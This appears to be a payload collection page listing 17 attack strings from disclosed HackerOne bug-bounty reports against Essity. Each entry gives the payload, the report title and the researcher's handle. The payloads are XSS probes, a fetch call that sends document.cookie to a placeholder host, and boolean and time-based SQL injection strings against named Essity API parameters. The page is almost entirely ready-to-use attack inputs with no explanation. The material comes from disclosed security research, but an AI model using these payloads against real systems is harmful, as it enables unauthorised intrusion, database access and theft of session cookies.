# Essity

17 payloads.

### `07a7df4f`

```
<img onerror>
```

— [Pre-authentication Stored XSS in Essity Customer-Service Pipeline via ContactApi (reCAPTCHA bypass + no rate limit)](https://hackerone.com/reports/3729501) · Essity · [matty69v](https://hackerone.com/matty69v)

### `33f62574`

```
"<script>alert(1)</script>"@a.com
```

— [Pre-authentication Stored XSS in Essity Customer-Service Pipeline via ContactApi (reCAPTCHA bypass + no rate limit)](https://hackerone.com/reports/3729501) · Essity · [matty69v](https://hackerone.com/matty69v)

### `568f11b3`

```
fetch('https://target.com/?c='+document.cookie)
```

— [Pre-authentication Stored XSS in Essity Customer-Service Pipeline via ContactApi (reCAPTCHA bypass + no rate limit)](https://hackerone.com/reports/3729501) · Essity · [matty69v](https://hackerone.com/matty69v)

### `23a62f0a`

```
app.alert(1)
```

— [Pre-authentication Stored XSS in Essity Customer-Service Pipeline via ContactApi (reCAPTCHA bypass + no rate limit)](https://hackerone.com/reports/3729501) · Essity · [matty69v](https://hackerone.com/matty69v)

### `9b4428c4`

```
GET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D1--
```

**Parameter:** `searchText`
— [Critical SQL Injection WDM API (████████)](https://hackerone.com/reports/3778282) · Essity · [matty69v](https://hackerone.com/matty69v)

### `94a7fad5`

```
GET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D2--
```

**Parameter:** `searchText`
— [Critical SQL Injection WDM API (████████)](https://hackerone.com/reports/3778282) · Essity · [matty69v](https://hackerone.com/matty69v)

### `5341a7e0`

```
GET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D2%20OR%20(SELECT%20COUNT(*)%20FROM%20sys.tables)%3E0--
```

**Parameter:** `searchText`
— [Critical SQL Injection WDM API (████████)](https://hackerone.com/reports/3778282) · Essity · [matty69v](https://hackerone.com/matty69v)

### `70fc978f`

```
GET /api/WDMProduct?searchText=zzz%27);WAITFOR%20DELAY%20%270:0:6%27--
```

**Parameter:** `searchText`
— [Critical SQL Injection WDM API (████████)](https://hackerone.com/reports/3778282) · Essity · [matty69v](https://hackerone.com/matty69v)

### `500088e7`

```
searchText=zzz') OR 1=1--
```

**Parameter:** `searchText`
— [Critical SQL Injection WDM API (████████)](https://hackerone.com/reports/3778282) · Essity · [matty69v](https://hackerone.com/matty69v)

### `b51dc9d0`

```
searchText=zzz');WAITFOR DELAY '0:0:6'--
```

**Parameter:** `searchText`
— [Critical SQL Injection WDM API (████████)](https://hackerone.com/reports/3778282) · Essity · [matty69v](https://hackerone.com/matty69v)

### `1b7b3011`

```
OR 1=1
```

— [Critical SQL Injection WDM API (████████)](https://hackerone.com/reports/3778282) · Essity · [matty69v](https://hackerone.com/matty69v)

### `679e05ef`

```
<br>
<script>alert(document.domain)</script> ████████, Tel: 123
<br>
```

— [Reflected XSS in legacy CGI script /cgi-bin/████████.pl on ████████ via `████████` parameter](https://hackerone.com/reports/3830771) · Essity · [marioniangi](https://hackerone.com/marioniangi)

### `556d69c0`

```
author_exclude=1) OR SLEEP(N)-- -
```

**Parameter:** `author_exclude`
— [Unauthenticated SQL Injection via REST Batch Route Confusion ████████](https://hackerone.com/reports/3873072) · Essity · [matty69v](https://hackerone.com/matty69v)

### `c60ca60a`

```
1) OR SLEEP(0)-- -
```

**Parameter:** `author_exclude`
— [Unauthenticated SQL Injection via REST Batch Route Confusion ████████](https://hackerone.com/reports/3873072) · Essity · [matty69v](https://hackerone.com/matty69v)

### `d4a4bd5b`

```
1) OR SLEEP(0.01)-- -
```

**Parameter:** `author_exclude`
— [Unauthenticated SQL Injection via REST Batch Route Confusion ████████](https://hackerone.com/reports/3873072) · Essity · [matty69v](https://hackerone.com/matty69v)

### `b214eeb6`

```
1) OR SLEEP(0.3)-- -
```

**Parameter:** `author_exclude`
— [Unauthenticated SQL Injection via REST Batch Route Confusion ████████](https://hackerone.com/reports/3873072) · Essity · [matty69v](https://hackerone.com/matty69v)

### `4ab510cb`

```
1) OR SLEEP(3)-- -
```

— [Unauthenticated SQL Injection via REST Batch Route Confusion ████████](https://hackerone.com/reports/3873072) · Essity · [matty69v](https://hackerone.com/matty69v)
